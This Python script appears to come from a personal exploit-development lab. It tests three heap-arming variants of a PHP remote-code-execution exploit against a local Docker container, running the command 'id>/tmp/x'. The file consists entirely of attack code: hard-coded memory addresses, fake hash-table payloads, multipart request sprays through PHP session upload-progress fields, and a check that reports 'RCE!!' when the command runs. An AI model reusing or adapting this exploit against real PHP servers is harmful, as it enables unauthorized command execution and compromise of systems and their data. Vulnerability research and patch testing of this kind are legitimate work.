#!/usr/bin/env python3
"""test_stage3_variants.py — find which arming leaves PS(http_session_vars) reclaimable on stock."""
import subprocess, sys, time
sys.path.insert(0, "/Users/bill/php2shell/lab")
sys.path.insert(0, "/Users/bill/php2shell/alvaro")
import exploit as alv          # noqa: E402
import exploit_stock           # noqa: F401,E402  (chunked-TE + big-_big overrides)

CHUNK = 0x7ffffe000000
HTDATA = 0x7e0d8               # confirmed: fake-HT data lands here on stock too
t = alv.Target("http://localhost:18110/index.php", timeout=150)
ex = alv.Exploit(t, "id>/tmp/x", 0x5996e0, 0x7b47a0, htdata=HTDATA, huge_mb=140)

def clear_proof():
    subprocess.run(["docker", "exec", "p2s", "sh", "-c", "rm -f /tmp/x"], capture_output=True)

def proof():
    return subprocess.run(["docker", "exec", "p2s", "cat", "/tmp/x"], capture_output=True, text=True).stdout.strip()

def send_exploit(htdata):
    ht = ex._fake_ht(htdata); live = ex._live_ref(htdata)
    parts = [{"name": "PHPSESSID", "data": b"a" * 100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(8): parts.append({"name": "m%04d" % i, "data": b"M" * 100})
    for i in range(80): parts.append({"name": (f"F{i:030d}")[:31], "data": b"z"})
    for i in range(200): parts.append({"name": "r%04d" % i, "data": live})
    parts.append({"name": (f"a{0:030d}")[:31], "data": ht})
    return t.post(alv.multipart(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30)

def try_variant(label, arm):
    clear_proof(); time.sleep(0.2)
    arm()
    resp = send_exploit(HTDATA)
    time.sleep(0.8)
    p = proof()
    status = "RCE!! " + repr(p) if p else "no rce"
    print(f"[{label}] {status}   (resp {len(resp)}B)")
    return bool(p)

# B: stage-1's WORKING arming shape (_oom b'x') then stage-3 exploit request
def arm_B():
    ex.rotate(); ex._oom(b"x")
try_variant("B rotate+_oom(x)", arm_B)

# C: _oom only, no rotate
def arm_C():
    ex._oom(b"x")
try_variant("C _oom(x) only", arm_C)

# D: _oom with 39-byte fill (stage-2's arming shape)
def arm_D():
    ex.rotate(); ex._oom(b"x" * 39)
try_variant("D rotate+_oom(x*39)", arm_D)
